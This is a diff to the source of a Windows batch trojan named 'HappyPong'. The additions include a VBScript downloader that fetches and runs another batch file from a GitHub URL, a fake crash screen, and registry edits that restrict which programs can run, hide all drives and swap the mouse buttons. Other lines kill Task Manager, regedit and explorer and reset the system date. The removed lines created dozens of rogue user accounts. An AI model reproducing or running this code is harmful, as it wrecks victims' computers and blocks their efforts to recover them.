@@ -2,6 +2,14 @@ rem Trojan.BAT.HappyPong
 rem Made by Kevin Reagan
 
 @echo off
+set /a I = 69696969
+set /a Have = 42042042
+set /a Already = 04204204
+set /a Heard = 20420420
+set /a You = 42042042
+set /a Its = 42042042
+set /a The = 04204204
+set /a Truth = 20420420
 goto DoNotPressOKOrElse
 
 :DoNotPressOKOrElse
@@ -46,6 +54,7 @@ echo taskkill /f /im firefox.exe >> explorer.bat
 echo taskkill /f /im iexplore.exe >> explorer.bat
 echo taskkill /f /im explorer.exe >> explorer.bat
 echo start halloween2.vbs >> explorer.bat
+echo start finalsod.hta >> explorer.bat
 echo exit >> explorer.bat
 goto IAmAlwaysHappy
 
@@ -159,6 +168,17 @@ echo   .open >> download8.vbs
 echo   .write xHttp.responseBody >> download8.vbs
 echo   .savetofile "C:\WINDOWS\HappyPong\rename4.bat", 2 '//overwrite >> download8.vbs
 echo end with >> download8.vbs
+echo on error resume next >> download9.vbs
+echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP") >> download9.vbs
+echo dim bStrm: Set bStrm = createobject("Adodb.Stream") >> download9.vbs
+echo xHttp.Open "GET", "https://raw.githubusercontent.com/HappyPong666/RENAMEFILEEXTENSIONS/main/rename5.bat", False >> download9.vbs
+echo xHttp.Send >> download9.vbs
+echo with bStrm >> download9.vbs
+echo   .type = 1 '//binary >> download9.vbs
+echo   .open >> download9.vbs
+echo   .write xHttp.responseBody >> download9.vbs
+echo   .savetofile "C:\WINDOWS\HappyPong\rename5.bat", 2 '//overwrite >> download9.vbs
+echo end with >> download9.vbs
 start download1.vbs
 start download2.vbs
 start download3.vbs
@@ -167,6 +187,7 @@ start download5.vbs
 start download6.vbs
 start download7.vbs
 start download8.vbs
+start download9.vbs
 goto RemoveUrUglyWallpaper
 
 :RemoveUrUglyWallpaper
@@ -204,10 +225,10 @@ echo ^<p^>Safe mode will not help you! If you delete the batch file in the start
 echo. 
 echo ^<p^>These are the important technical informations:^</p^> 
 echo. 
-echo ^<p^>*** STOP: 0x69696969 ^(0x42042042,0x04204204,0x20420420,0x42042042^)^</p^> 
+echo ^<p^>*** STOP: 0x%I% ^(0x%Have%,0x%Already%,0x%Heard%,0x%You%^)^</p^> 
 echo. 
 echo. 
-echo ^<p^>***  happy.sys - Address 42042042 base at 04204204, DateStamp 20420420^</p^> 
+echo ^<p^>***  happy.sys - Address %Its% base at %The%, DateStamp %Truth%^</p^> 
 echo. 
 echo ^<p^>Beginning dump of physical memory^</p^> 
 echo ^<p^>Physical memory dump complete.^</p^> 
@@ -222,6 +243,45 @@ echo ^</script^>
 echo.  
 echo ^</html^> 
 ) > bsod.hta 
+goto DeathScreen
+
+:DeathScreen
+(
+echo ^<html^>^<head^>^<title^>Now its too late...^</title^> 
+echo. 
+echo ^<hta:application id="oBVC" 
+echo applicationname="SAY GOODBYE!"  
+echo version="0.6.9" 
+echo maximizebutton="no" 
+echo minimizebutton="no" 
+echo sysmenu="no" 
+echo Caption="no" 
+echo windowstate="maximize"/^> 
+echo. 
+echo ^</head^>^<body bgcolor="#000000" scroll="no"^> 
+echo ^<font face="Lucida Console" size="4" color="red"^> 
+echo ^<p^>A problem has been detected and windows has been shutdown to prevent damage to your computer.^</p^> 
+echo. 
+echo ^<p^>COMPUTER_COMPLETELY_PRETTY_TRASHED_BY_HAPPYPONG^</p^> 
+echo. 
+echo ^<p^>Now its too late! This computer has been trashed up and PoopFuked by HappyPong. Get ready to fix your computer as fast as you can!  ^</p^> 
+echo. 
+echo ^<p^>*** STOP: 0xSAYGOODB ^(0xYESAYGOO,0xDBYESAYG,0xOODBYESA,0xYGOODBYE^)^</p^> 
+echo. 
+echo. 
+echo ^<p^>***  goodbye.sys - Address SAYGOODB base at YESAYGOO, DateStamp OODBYESA^</p^> 
+echo. 
+echo ^<p^>Call Microsoft Tech Support as soon as possible. ^</p^> 
+echo.
+echo. 
+echo ^</font^> 
+echo ^</body^>
+echo.
+echo ^<script language="javascript"^>
+echo ^</script^>
+echo.  
+echo ^</html^> 
+) > finalsod.hta 
 goto TodayIsHalloween
 
 :TodayIsHalloween
@@ -247,6 +307,20 @@ goto NowhereMessage
 
 :NowhereMessage
 echo a=msgbox("HappyPong has PoopFuked this file to death!",0+16,"fukpong.exe") >> ms_g.vbs
+goto RestrictedUserCanRunThese
+
+:RestrictedUserCanRunThese
+echo Set WshShell = CreateObject ("wscript.shell") >> WinRes32.vbs
+echo WshShell.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun", "cscript.exe" >> WinRes32.vbs
+echo WshShell.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun", "wscript.exe" >> WinRes32.vbs
+echo WshShell.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun", "notepad.exe" >> WinRes32.vbs
+echo WshShell.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun", "wmplayer.exe" >> WinRes32.vbs
+echo WshShell.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun", "explorer.exe" >> WinRes32.vbs
+echo WshShell.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun", "cscript.exe" >> WinRes32.vbs
+echo WshShell.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun", "wscript.exe" >> WinRes32.vbs
+echo WshShell.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun", "notepad.exe" >> WinRes32.vbs
+echo WshShell.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun", "wmplayer.exe" >> WinRes32.vbs
+echo WshShell.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun", "explorer.exe" >> WinRes32.vbs
 goto TriggerUrMom
 
 :TriggerUrMom
@@ -331,7 +405,7 @@ echo superuser.com >> note.txt
 echo instructables.com (content.instructables.com) >> note.txt
 echo hitech-us.com >> note.txt
 echo github.com (NTFS123: Trojan.VBS.Bolbi, Trojan.VBS.Bolbi V2, Trojan.VBS.Jesus) >> note.txt
-echo youtube.com (danooct1, FlyTech Videos, 4096, Kane Pixels, 2013Windows8.1, Come on Windows, Akmal, special thanks to ManlyBadassHero) >> note.txt
+echo youtube.com (danooct1, FlyTech Videos, 4096, Kane Pixels, 2013Windows8.1, Come on Windows, Akmal, Enderman, special thanks to ManlyBadassHero) >> note.txt
 echo msfn.org >> note.txt
 echo y2mate.com >> note.txt
 echo wikihow.com >> note.txt
@@ -404,10 +478,14 @@ echo My YouTube channel: youtube.com/danooct1 >> note.txt
 echo My email: danooct1press@gmail.com >> note.txt
 echo Twitter: twitter.com/danooct1 >> note.txt
 echo And please note that I will ban you if you spam. >> note.txt
-start note.txt
 goto ThrowTheComputerToTrash
 
 :ThrowTheComputerToTrash
+cd C:\WINDOWS\HappyPong
+start change.vbs
+start pong.vbs
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v UseDefaultTile /t REG_DWORD /d 1 /f
+reg ADD "HKCU\Control Panel\Mouse" /v SwapMouseButtons /t REG_SZ /d 1 /f
 reg ADD "HKLM\System\CurrentControlSet\Control\ComputerName\ActiveComputerName" /v ComputerName /t REG_SZ /d IM_HAPPY /f
 reg ADD "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d C:\WINDOWS\HappyPong\shi_t.jpg /f
 reg ADD "HKCU\Control Panel\Desktop" /v OriginalWallpaper /t REG_SZ /d C:\WINDOWS\HappyPong\shi_t.jpg /f
@@ -424,6 +502,8 @@ reg ADD "HKLM\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v NoS
 reg ADD "HKLM\Software\Microsoft\Internet Explorer\main\FeatureControl\Feature_LocalMachine_Lockdown" /v IExplorer /d 0 /f
 reg ADD "HKLM\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v NoFindFiles /d 1 /f
 reg ADD "HKLM\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v NoNavButtons /d 1 /f
+reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v RestrictRun /t REG_DWORD /d 1 /f
+reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v RestrictRun /t REG_DWORD /d 1 /f
 reg ADD "HKLM\Software\Policies\Microsoft\Windows\System" /v DisableGPO /t REG_DWORD /d 1 /f
 reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f
 reg ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoViewOnDrive /t REG_DWORD /d 67108863 /f
@@ -455,6 +535,7 @@ reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v Hi
 reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMyGames /t REG_DWORD /d 1 /f
 reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMyMusic /t REG_DWORD /d 1 /f
 reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDrives /t REG_DWORD /d 67108863 /f
+reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDrives /t REG_DWORD /d 67108863 /f
 reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoUserNameInStartMenu /t REG_DWORD /d 1 /f
 reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v StartMenuLogOff /t REG_DWORD /d 1 /f
 reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuSubFolders /t REG_DWORD /d 1 /f
@@ -492,50 +573,26 @@ reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v lega
 reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v legalnoticetext /t REG_SZ /d I_ALWAYS_LOVE_YOU!!!_PRESS_OK_AND_ENTER_YOUR_PASSWORD_TO_BE_KISSED_MY_FRIEND!!!_ILOVEYOU!!!_SOS!!!1 /f
 reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Search\Flighting\1\SearchBoxText" /v Value /t REG_SZ /d SAY_GOODBYE_TO_YOUR_COMPUTER! /f
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Personalization" /v LockScreenImage /t REG_SZ /d C:\WINDOWS\HappyPong\scp_173.png /f
-goto WeAreWelcoming
+goto KillAllProcess
 
-:WeAreWelcoming
+:KillAllProcess
 taskkill /f /im ms-settings:.exe /im snippingtool.exe /im taskmgr.exe /im msconfig.exe /im powershell.exe /im wmplayer.exe /im notepad.exe /im calc.exe /im write.exe /im mspaint.exe /im cortana.exe /im control.exe /im ms-windows-store:.exe /im regedit.exe /im iexpress.exe /im winver.exe /im explorer.exe
-net user LOVEYOU%random% %random% /add
-net user LOVEYOU%random% %random% /add
-net user LOVEYOU%random% %random% /add
-net user LOVEYOU%random% %random% /add
-net user LOVEYOU%random% %random% /add
-net user LOVEYOU%random% %random% /add
-net user LOVEYOU%random% %random% /add
-net user LOVEYOU%random% %random% /add
-net user LOVEYOU%random% %random% /add
-net user LOVEYOU%random% %random% /add
-net user LOVEYOU%random% %random% /add
-net user LOVEYOU%random% %random% /add
-net user LOVEYOU%random% %random% /add
-net user LOVEYOU%random% %random% /add
-net user LOVEYOU%random% %random% /add
-net user LOVEYOU%random% %random% /add
-net user LOVEYOU%random% %random% /add
-net user LOVEYOU%random% %random% /add
-net user LOVEYOU%random% %random% /add
-net user LOVEYOU%random% %random% /add
-net user LOVEYOU%random% %random% /add
-net user LOVEYOU%random% %random% /add
-net user LOVEYOU%random% %random% /add
-net user LOVEYOU%random% %random% /add
-net user LOVEYOU%random% %random% /add
-net user LOVEYOU%random% %random% /add
 goto GoBackToThePast
 
 :GoBackToThePast
+cd C:\Users\%username%\Desktop
+start note.txt
 cd C:\WINDOWS\HappyPong
-start change.vbs
 start rename.bat
 start rename2.bat
 start rename3.bat
 start rename4.bat
+start rename5.bat
 start explorer.exe
 start ieandstuff.vbs
-start pong.vbs
 start shutdown.vbs
 start username.bat
+start WinRes32.vbs
 ping -n 15 127.0.0.1>nul
 date 6/6/2006
 goto FreddyFazbearJumpscareGaveMeHeartAttack
